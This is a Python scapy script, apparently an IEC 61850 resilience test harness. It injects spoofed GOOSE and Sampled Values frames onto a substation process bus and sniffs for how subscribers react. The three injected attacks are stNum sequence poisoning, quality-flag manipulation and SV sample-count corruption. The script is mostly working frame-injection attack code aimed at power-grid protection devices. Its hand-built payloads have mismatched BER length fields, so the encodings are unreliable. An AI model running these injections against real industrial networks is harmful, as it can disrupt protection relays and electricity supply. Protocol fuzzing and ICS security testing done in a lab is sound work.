#!/usr/bin/env python3
import sys
import time
from scapy.all import AsyncSniffer, Ether, Raw, sendp
from rich.console import Console
from rich.panel import Panel
from rich.table import Table

console = Console()

ETHERTYPE_GOOSE = 0x88B8
ETHERTYPE_SV = 0x88BA


def inject_anomaly_frame(iface: str, attack_type: str):
    """Injects specific rogue Layer 2 IEC 61850 frames to test IED subscriber resilience."""
    dst_mac = "01:0c:cd:01:00:01"
    src_mac = "de:ad:be:ef:ff:ff"  # Rogue/Attacker MAC indicator

    if attack_type == "stnum_poison":
        console.print(f"[bold red][!] Injecting stNum Poisoning (Massive sequence jump) on [cyan]{iface}[/]...")
        # Poison payload: Force an impossibly high stNum (e.g., 9999) and reset sqNum
        payload = b"\x61\x81\x00" + b"\x80\x02\x27\x0f" + b"\x84\x02\x27\x0f" + b"\x85\x01\x00"
        desc = "stNum Jumped to 9999 / Burst Flood"

    elif attack_type == "quality_flag":
        console.print(f"[bold yellow][!] Injecting Quality Flag Manipulation (Marking Invalid/Test) on [cyan]{iface}[/]...")
        # Payload mocking quality bitmask override (e.g., Test=True, Validity=Invalid)
        payload = b"\x61\x81\x00" + b"\x80\x02\x00\x02" + b"\x87\x01\x03" # 0x03 = Invalid/Questionable
        desc = "Data Quality Flag set to Invalid/Test"

    elif attack_type == "sv_freq_anomaly":
        console.print(f"[bold magenta][!] Injecting SV Frequency/Phase Anomaly (50Hz/60Hz mismatch) on [cyan]{iface}[/]...")
        # Payload mocking Merging Unit sample count mismatch or phase corruption
        payload = b"\x60\x81\x10" + b"\x80\x08MU01_Voltage" + b"\x82\x02\x05\xdc" # sample count anomaly
        desc = "SV Waveform / Sample Count Corruption"
    else:
        return

    frame = Ether(dst=dst_mac, src=src_mac, type=ETHERTYPE_GOOSE if "sv" not in attack_type else ETHERTYPE_SV) / Raw(load=payload)
    
    # Send multiple bursts to test rate-limiting / state acceptance
    for _ in range(3):
        sendp(frame, iface=iface, verbose=False)
        time.sleep(0.1)
        
    return desc


def packet_callback(packet):
    if not packet.haslayer(Ether):
        return
    eth = packet.getlayer(Ether)
    if eth.type not in [ETHERTYPE_GOOSE, ETHERTYPE_SV]:
        return

    table = Table(title="Phase 5 Anomaly Monitoring & Reaction", show_header=True, header_style="bold red")
    table.add_column("Indicator", style="dim", width=22)
    table.add_column("Observed Detail", style="yellow")

    table.add_row("EtherType", f"0x{eth.type:04X}")
    table.add_row("Source MAC (Sender)", eth.src)
    table.add_row("Destination MAC", eth.dst)
    table.add_row("Status", "[bold red]Anomaly Injected / Monitored[/]")
    table.add_row("Payload Hex", bytes(eth.payload).hex()[:40] + "...")

    console.print(Panel(table, title="[bold red]IEC 61850 Edge-Case Interceptor[/]", border_style="red"))


def main():
    interface = sys.argv[1] if len(sys.argv) > 1 else "br-processbus"
    console.print(f"[bold green][*][/] Initializing Phase 5 Test Harness on interface: [cyan]{interface}[/]")

    # Start monitoring bridge traffic for subscriber reactions
    sniffer = AsyncSniffer(iface=interface, filter="ether proto 0x88b8 or ether proto 0x88ba", prn=packet_callback, store=False)
    sniffer.start()
    time.sleep(1)

    # Sequentially fire all three phase anomaly test vectors
    try:
        for anomaly in ["stnum_poison", "quality_flag", "sv_freq_anomaly"]:
            inject_anomaly_frame(interface, anomaly)
            time.sleep(1.5)

        console.print("\n[bold green][*][/] Anomaly test suite complete. Listening for subscriber reactions (Ctrl+C to exit)...")
        sniffer.join()
    except KeyboardInterrupt:
        console.print("\n[bold red][!][/] Stopping Phase 5 Test Harness.")
        sniffer.stop()


if __name__ == "__main__":
    main()